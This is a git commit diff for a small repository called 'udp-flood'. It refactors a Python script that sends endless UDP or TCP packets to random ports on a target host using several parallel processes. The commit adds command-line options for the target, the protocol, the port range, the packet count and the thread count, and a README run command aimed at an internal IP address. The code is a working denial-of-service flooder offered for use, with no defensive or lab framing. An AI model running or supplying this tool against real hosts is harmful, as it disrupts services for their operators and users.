11022c2af41edea642ea7894c3fe86e13f277135
mihalin <stopa3.10.1996@mail.ru>
2020-10-13 18:52:01 +0300

    More nice script

--- README.md
+++ README.md
@@ -1,2 +1,7 @@
 # udp-flood
 Simple python script for TCP\UDP flood
+
+Run:
+```
+python flood.py 172.16.3.140
+```
--- flood.py
+++ flood.py
@@ -2,18 +2,13 @@ import random
 import socket
 from multiprocessing import Process
 import os
-
-ip = "172.16.3.197"
-udp = True
-portr = (1000, 2000)
-times = 1000
-threads = 4
+from argparse import ArgumentParser
 
 
-def flood():
-	data = random._urandom(1024)
+def flood(ip: str, udp: bool, port_from: int, port_to: int, times: int):
+	data = random.randint(1, 1024).to_bytes(length=8, byteorder="big", signed=False)
 	while True:
-		port = random.randint(*portr)
+		port = random.randint(port_from, port_to)
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
 			addr = (str(ip), int(port))
@@ -25,5 +20,16 @@ def flood():
 
 
 if __name__ == '__main__':
-	for _ in range(threads):
-		Process(target=flood).start()
+
+	parser = ArgumentParser("Simple UDP\\TCP flooder")
+	parser.add_argument("host", help="Host (example: 172.16.3.140")
+	parser.add_argument("--tcp", help="Use TCP (default: use UDP)", action="store_true")
+	parser.add_argument("--port-from", help="Random port min", type=int, default=0)
+	parser.add_argument("--port-to", help="Random port max", type=int, default=65535)
+	parser.add_argument("--packets", help="Packets count per one connection", type=int, default=1000)
+	parser.add_argument("--threads", help="Threads count", type=int, default=12)
+
+	args = parser.parse_args()
+
+	for _ in range(args.threads):
+		Process(target=flood, args=(args.host, not args.tcp, args.port_from, args.port_to, args.packets)).start()
